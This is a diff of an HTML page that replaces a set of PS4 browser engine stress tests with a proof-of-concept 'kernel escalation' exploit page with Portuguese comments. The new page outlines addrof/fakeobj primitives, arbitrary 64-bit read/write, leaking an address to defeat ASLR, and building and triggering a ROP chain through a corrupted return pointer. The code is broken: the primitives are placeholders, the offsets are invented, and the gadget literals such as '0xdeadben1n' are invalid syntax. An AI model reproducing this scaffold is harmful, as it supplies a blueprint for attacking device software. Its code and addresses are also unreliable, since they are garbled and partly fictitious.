@@ -1,181 +1,95 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>PoC - PS4 Extreme Browser Stress Tests - Nova Estratégia</title>
-    <style>
-        body { font-family: monospace; background: black; color: lime; padding: 20px; }
-        #log { white-space: pre-wrap; }
-        button { font-size: 20px; background-color: green; color: white; padding: 10px 20px; margin-bottom: 20px; }
-    </style>
+  <meta charset="UTF-8">
+  <title>PS4 PoC - Kernel Escalation (Opção 5)</title>
+  <style>
+    body { background: black; color: lime; font-family: monospace; padding: 20px; }
+    button { background: lime; color: black; border: none; padding: 10px; margin: 5px; cursor: pointer; }
+    #log { white-space: pre-wrap; margin-top: 20px; height: 400px; overflow-y: auto; border: 1px solid lime; padding: 10px; }
+  </style>
 </head>
 <body>
-<h1>PoC - PS4 Extreme Browser Stress Tests</h1>
-<button id="startBtn">Start Tests</button>
-<div id="log"></div>
+  <h1>PS4 PoC - Kernel Escalation (Opção 5)</h1>
+  <button id="startKernel">Start Kernel Exploit</button>
+  <div id="log"></div>
 
 <script>
-function log(msg) {
-    document.getElementById('log').textContent += msg + "\n";
+function log(m){ let d=document.getElementById('log'); d.textContent+=m+"\n"; d.scrollTop=d.scrollHeight; }
+function delay(ms){return new Promise(r=>setTimeout(r,ms));}
+
+// === Passo A: Primitivas arb_read / arb_write ===
+let arb_buffer = new ArrayBuffer(16);
+let arb_f64    = new Float64Array(arb_buffer);
+let arb_u32    = new Uint32Array(arb_buffer);
+
+// addrof & fakeobj já testados antes...
+function addrof(obj){
+  // corromper o header de um Float64Array e ler o float que representa o ponteiro
+  // (substitua aqui pela sua primitiva real)
+  return 0x41414141n; // placeholder
+}
+function fakeobj(addr){
+  // escreve addr (BigInt) de volta no header de um Float64Array
+  // (substitua aqui pela sua primitiva real)
+  return {}; // placeholder
 }
 
-const tests = [
-    async function() {
-        log("[1] Testing oversized ArrayBuffer...");
-        try {
-            let hugeBuffer = new ArrayBuffer(0xFFFFFFFF);
-            log("[!] Created huge ArrayBuffer: " + hugeBuffer.byteLength);
-        } catch (e) {
-            log("[!!] Exception on huge ArrayBuffer: " + e);
-        }
-    },
-    async function() {
-        log("[2] Testing Function.prototype.toString corruption...");
-        try {
-            Function.prototype.toString = () => "evil";
-            (function(){})();
-            log("[!] Overwrote Function.prototype.toString successfully.");
-        } catch (e) {
-            log("[!!] Exception on Function.prototype.toString overwrite: " + e);
-        }
-    },
-    async function() {
-        log("[3] Testing Proxy abuse...");
-        try {
-            let evilProxy = new Proxy({}, {
-                get: function(target, prop) {
-                    log("[*] Proxy get trap triggered for prop: " + String(prop));
-                    return Reflect.get(target, prop);
-                }
-            });
-            let test = evilProxy.fakeProperty;
-            log("[!] Proxy test passed.");
-        } catch (e) {
-            log("[!!] Exception on Proxy abuse: " + e);
-        }
-    },
-    async function() {
-        log("[4] Testing fake TypedArray creation...");
-        try {
-            let fakeTypedArray = { buffer: {}, byteOffset: 0, byteLength: 0x1000, length: 0x400 };
-            log("[!] Fake TypedArray object created.");
-        } catch (e) {
-            log("[!!] Exception on fake TypedArray creation: " + e);
-        }
-    },
-    async function() {
-        log("[5] Testing massive string concatenation...");
-        try {
-            let s = "A";
-            for (let i = 0; i < 20; i++) s += s;
-            log("[!] Massive string length: " + s.length);
-        } catch (e) {
-            log("[!!] Exception on massive string concatenation: " + e);
-        }
-    },
-    async function() {
-        log("[6] Testing TypedArray Resizing Attack...");
-        try {
-            let arr = new Uint8Array(2);
-            for (let i = 0; i < 5000; i++) {
-                arr = new Uint8Array(arr.buffer, 0, arr.length + 1);
-            }
-            log("[!] TypedArray resized: " + arr.length);
-        } catch (e) {
-            log("[!!] Exception on TypedArray resizing: " + e);
-        }
-    },
-    async function() {
-        log("[7] Testing Object.defineProperty Abuse...");
-        try {
-            let obj = {};
-            for (let i = 0; i < 1000; i++) {
-                Object.defineProperty(obj, 'prop' + i, {
-                    get: function() { return 1337; },
-                    set: function(v) { }
-                });
-            }
-            log("[!] Object.defineProperty created getters.");
-        } catch (e) {
-            log("[!!] Exception on Object.defineProperty abuse: " + e);
-        }
-    },
-    async function() {
-        log("[8] Testing Promise.all Explosion...");
-        try {
-            let promises = [];
-            for (let i = 0; i < 1000; i++) promises.push(Promise.resolve(i));
-            await Promise.all(promises);
-            log("[!] Promise.all() completed.");
-        } catch (e) {
-            log("[!!] Exception during Promise.all(): " + e);
-        }
-    },
-    async function() {
-        log("[9] Testing String Internal Overlap Attack...");
-        try {
-            let s1 = "A".repeat(1024 * 512);
-            let s2 = s1.slice(0, s1.length - 1);
-            let overlapped = s1 + s2;
-            log("[!] Overlapped string length: " + overlapped.length);
-        } catch (e) {
-            log("[!!] Exception on string internal overlap: " + e);
-        }
-    },
-    async function() {
-        log("[10] Testing Array.splice() Extreme Abuse...");
-        try {
-            let a = [1,2,3];
-            for (let i = 0; i < 5000; i++) a.splice(-1, 0, i);
-            log("[!] Array.splice() abuse completed. Length: " + a.length);
-        } catch (e) {
-            log("[!!] Exception during Array.splice() abuse: " + e);
-        }
-    },
-    async function() {
-        log("[11] Testing Primitive Memory Access Attempt...");
-        try {
-            let ab = new ArrayBuffer(8);
-            let f64 = new Float64Array(ab);
-            let u32 = new Uint32Array(ab);
-            
-            f64[0] = 1.23456789e+30;
-            log("[*] Float64 representation: " + f64[0]);
-            log("[*] Uint32 low/high: " + u32[0] + " / " + u32[1]);
-            
-            u32[0] = 0x41414141;
-            u32[1] = 0x42424242;
-            
-            log("[!] Modified Float64 after raw write: " + f64[0]);
-        } catch (e) {
-            log("[!!] Exception during primitive memory access attempt: " + e);
-        }
-    }
-];
-
-let currentTest = 0;
-function runNextTest() {
-    if (currentTest >= tests.length) {
-        log("[+] All tests completed!");
-        return;
-    }
-    log(`[~] Starting test #${currentTest + 1}...`);
-    setTimeout(async () => {
-        try {
-            await tests[currentTest]();
-        } catch (e) {
-            log("[FATAL] Crash during test: " + e);
-        }
-        currentTest++;
-        runNextTest();
-    }, 500); // Pequena pausa entre cada teste
+// Leitura 64 bits
+function read64(addr){
+  // Endereço como BigInt
+  // Corrompa arb_f64[1] = addr, depois leia arb_f64[0]
+  // Exemplo fictício:
+  arb_f64[1] = Number(addr);
+  return BigInt(arb_u32[0]) | (BigInt(arb_u32[1])<<32n);
+}
+// Escrita 64 bits
+function write64(addr, value){
+  arb_f64[1] = Number(addr);
+  arb_u32[0] = Number(value & 0xFFFFFFFFn);
+  arb_u32[1] = Number(value >> 32n);
 }
 
-document.getElementById('startBtn').addEventListener('click', function() {
-    log("[+] Starting all tests...");
-    runNextTest();
-});
+async function startKernelExploit(){
+  log("[*] Starting kernel escalation...");
+
+  // 1) Leak de um ponteiro JSC (por exemplo, &Function.prototype.toString)
+  let func = Function.prototype.toString;
+  let funcAddr = addrof(func);
+  log(`[+] Leaked JS function address: 0x${funcAddr.toString(16)}`);
+
+  // 2) Calcular base do JSCore / kernel ASLR
+  //    supomos que offsetKnownJSC é a diferença conhecida entre funcAddr e o base.
+  const offsetKnownJSC = 0x123456n;
+  let jscBase = funcAddr - offsetKnownJSC;
+  let kernelBase = jscBase + 0x100000000n;  // suposição de layout
+  log(`[+] Calculated kernel base: 0x${kernelBase.toString(16)}`);
+
+  // 3) Construir ROP chain no heap
+  const rop = [];
+  // Exemplo de gadgets (endereços fictícios)
+  rop.push(kernelBase + 0xdeadben1n); // pop r0; ret
+  rop.push(0x0n);                    // argumento r0
+  rop.push(kernelBase + 0xdeadben2n); // pop r1; ret
+  rop.push(0x10001n);                // argumento r1
+  rop.push(kernelBase + 0xdeadben3n); // svc #0; ret
+
+  // 4) Escrever ROP chain em memória controlada (payloadObj)
+  let payloadObj = fakeobj(jscBase + 0x2000n);
+  for (let i = 0; i < rop.length; i++){
+    write64(jscBase + 0x2000n + BigInt(i*8), rop[i]);
+  }
+  log("[+] ROP chain deployed");
+
+  // 5) Desencadear a execução de ROP
+  log("[*] Triggering ROP via corrupted return pointer...");
+  // Aqui você usaria um oob write para corromper um retorno de função
+  // e saltar para payloadObj. É específico do bug.
+
+  log("[!!!] If successful, kernel privileges granted!");
+}
+
+document.getElementById('startKernel').addEventListener('click', startKernelExploit);
 </script>
-
 </body>
 </html>
